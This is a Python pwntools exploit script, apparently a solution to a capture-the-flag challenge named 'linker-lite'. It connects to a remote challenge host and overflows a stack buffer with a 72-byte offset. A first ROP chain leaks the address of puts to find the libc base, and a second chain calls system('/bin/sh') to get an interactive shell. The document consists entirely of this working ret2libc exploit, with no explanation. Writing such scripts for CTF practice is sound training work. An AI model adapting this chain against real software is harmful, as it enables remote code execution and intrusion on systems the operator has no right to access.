from pwn import *

elf = context.binary = ELF('./linker-lite_patched')
# p = process()
p = remote('linker-lite.wolvctf-2026.kctf.cloud', 1337)
rop = ROP(elf)
libc = ELF('./libc.so.6')

rdi = p64(0x401223) # pop rdi ; pop rsi ; pop rdx ; ret
ret = rop.find_gadget(['ret'])[0]
# load = elf.sym['load_plugin']
main = elf.sym['_start']
# offset = 192
offset = 72

payload = flat(
    'A'*offset,
    rdi, elf.got['puts'],
    p64(0), p64(0), ret,
    elf.plt['puts'], main
)

p.sendafter('send plugin blob:\n', payload.ljust(0x100, b'\x00'))
leak_raw = p.recvline().strip()
# leak_raw = p.recvn(6)
log.info(f"Raw leak bytes: {leak_raw.hex()}")
leak = leak_raw.ljust(8, b'\x00')
leaked_puts = u64(leak)
log.info(f"Leaked puts address: {hex(leaked_puts)}")
libc.address = leaked_puts - libc.sym['puts']
log.info(f"libc base: {hex(libc.address)}")

system_addr = libc.sym['system']
binsh_addr = next(libc.search(b"/bin/sh\x00"))

one_gadget = libc.address + 0xebd03
payload2 = flat(
    'A'*offset,
    rdi, binsh_addr, p64(0), p64(0), 
    ret,
    system_addr
)

p.sendafter('send plugin blob:\n', payload2.ljust(0x100, b'\x00'))
p.interactive()